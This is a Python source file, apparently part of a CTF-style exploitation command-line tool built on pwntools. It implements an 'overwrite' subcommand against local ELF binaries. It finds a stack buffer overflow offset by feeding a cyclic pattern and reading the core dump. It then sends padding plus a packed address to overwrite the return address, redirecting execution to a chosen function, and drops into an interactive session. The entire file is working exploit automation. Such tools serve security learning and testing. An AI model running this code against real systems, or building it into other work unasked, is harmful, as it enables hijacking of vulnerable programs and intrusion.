import argparse, sys, pathlib, utils, pwn, os, contextlib
from logger import Logger

#pwn.context.log_level = 'error'

class Overwrite:
    command = 'overwrite'

    def __init__(self):
        parser = argparse.ArgumentParser(
            description='Overwrite a return address to access specific part of the binary'
        )
        # prefixing the argument with -- means it's optional
        parser.add_argument('--target', type=str, help='Function to reach may be function name or address')
        parser.add_argument('binary', nargs='?', type=pathlib.Path, help='Binary to exploit')
        # now that we're inside a subcommand, ignore the first
        # TWO argvs, ie the command (git) and the subcommand (commit)
        sysargs = sys.argv[2:]
        if len(sysargs):
            args = parser.parse_args(sys.argv[2:])

            self.binary = args.binary
            self.target = args.target

            if not self.binary or not self.target:
                Logger.error(f'You have to specify a {Logger.custom("binary", color="red", style="bold")} and a {Logger.custom("target", color="red", style="bold")} to exploit\n')
                parser.print_help()
                exit(1)

            self.main()

        else:
            parser.print_help()

    def parse_target(self):
        address = 0

        if self.target[0:2] == '0x':
            address = int(self.target, 16)
        else:
            address = self.ELF.symbols[self.target]

        Logger.success(f'Target address is {hex(address)}')
        return address

    def architecture_setup(self):
        if self.ELF.arch == 'amd64':
            self.sp_register = 'rsp'
            self.packing = 'p64'
        elif self.ELF.arch == 'i386':
            self.sp_register = 'esp'
            self.packing = 'p32'
        else:
            Logger.error('Architecture unrecognized')
            exit(1)

    def get_overflow_offset(self):
        process = pwn.process(str(self.binary))
        process.sendline(pwn.cyclic(200, n=4))
        process.wait()

        try:
            core = process.corefile
            overflow_offset = pwn.cyclic_find(core.read(getattr(core, self.sp_register), 4), n=4)
            Logger.success(f'Overflow offset found: {overflow_offset}')

            os.remove(core.path)

            return overflow_offset

        except Exception as e:
            print(e)
            os.remove(core.path)


    def main(self):
        if utils.check_binary(self.binary):
            Logger.info('Starting exploitation\n')

            self.ELF = pwn.ELF(self.binary)
            self.architecture_setup()

            target_address = self.parse_target()
            overflow_offset = self.get_overflow_offset()

            process = pwn.process(str(self.binary))
            process.sendline(b'A'* overflow_offset + getattr(pwn, self.packing)(target_address))
            process.interactive()
            exit(0)
